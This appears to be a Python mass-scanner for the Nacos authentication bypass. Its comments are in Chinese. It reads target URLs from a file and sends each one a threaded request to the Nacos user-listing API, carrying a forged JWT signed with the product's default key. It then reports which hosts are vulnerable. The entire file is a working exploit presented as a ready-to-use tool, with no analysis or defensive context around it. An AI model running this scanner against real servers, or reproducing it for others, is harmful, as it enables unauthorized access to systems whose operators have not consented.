import requests
import urllib3
import threading

urllib3.disable_warnings()

# 定义自定义路径和Header
custom_path = '/nacos/v1/auth/users?pageNo=1&pageSize=2'
header = {
    "User-Agent": "Nacos-Server",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Pragma": "no-cache",
    "Te": "trailers",
    "Cache-Control": "no-cache",
}

# 定义函数，用于发起GET请求并判断回显结果，每次调用这个函数发送一个请求
def send_request(url):
    full_url = url + custom_path  # 拼接完整URL
    try:
        response = requests.get(full_url, headers=header, verify=False, timeout=2)
        if response.status_code == 200 and response.content.find(b"pageNumber") != -1:
            print(f'{url} 存在nacos身份验证绕过漏洞')
        else:
            print(f'{url} 不存在nacos身份验证绕过漏洞')
    except requests.exceptions.RequestException as e:
        print(f'{url} 访问失败 {e}')

# 从url.txt文件中读取URL列表
with open('url.txt', 'r') as f:
    urls = f.read().splitlines()

threads = []
for url in urls:
    t = threading.Thread(target=send_request, args=(url,))
    threads.append(t)
    t.start()

# 等待所有线程完成
for t in threads:
    t.join()
